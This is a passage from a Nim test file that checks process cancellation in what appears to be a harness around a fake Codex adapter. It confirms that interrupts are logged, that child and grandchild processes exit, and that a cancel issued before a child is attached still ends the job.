      check logged().filterIt(it{"method"}.getStr == "turn/interrupt").len == 1 # it was asked first
      var gone = false
      for _ in 0 ..< 60:
        if not alive(child) and not alive(grandchild):
          gone = true
          break
        sleep(50)
      check gone
      check gotEvents.ofKind(ukError).len == 0
      freeTurnControl(ctl)

  test "a cancel that arrives before the child is attached still ends it":
    when defined(windows):
      skip()
    else:
      begin("deaf", "interrupt_pre.jsonl")
      putEnv("FAKE_CODEX_PIDFILE", scratch / "pids2.txt")
      var done = false
      var cancelled = false
      let ctl = newTurnControl()
      ctl.cancel("stop") # nothing to kill yet; remembered
      var job = Job(adapter: fakeAdapter(), ctl: ctl, done: addr done, cancelled: addr cancelled)
      gotEvents = @[]
      createThread(jobThread, jobMain, addr job)
      joinThread(jobThread) # returns because attach() sees the cancel and ends the child
      check done and cancelled
      freeTurnControl(ctl)
